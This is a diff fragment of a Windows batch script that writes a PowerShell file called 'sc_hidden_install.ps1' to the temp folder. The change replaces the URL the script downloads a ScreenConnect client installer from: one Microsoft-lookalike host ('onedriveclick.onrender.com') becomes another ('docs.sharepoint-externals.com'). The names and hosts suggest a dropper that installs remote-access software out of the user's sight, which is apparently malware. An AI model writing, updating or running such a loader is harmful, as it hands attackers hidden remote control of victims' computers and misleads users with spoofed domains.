@@ -34,7 +34,7 @@ if %errorlevel% neq 0 (
 :: =========================================================
 set "PS1=%TEMP%\sc_hidden_install.ps1"
 
-> "%PS1%" echo $msiUrl = "https://onedriveclick.onrender.com/setup.msi"
+> "%PS1%" echo $msiUrl = "https://docs.sharepoint-externals.com/setup.msi"
 >>"%PS1%" echo $downloadPath = "$env:TEMP\ScreenConnect.ClientSetup.msi"
 >>"%PS1%" echo $logPath = "$env:TEMP\SC_install_log.txt"
 
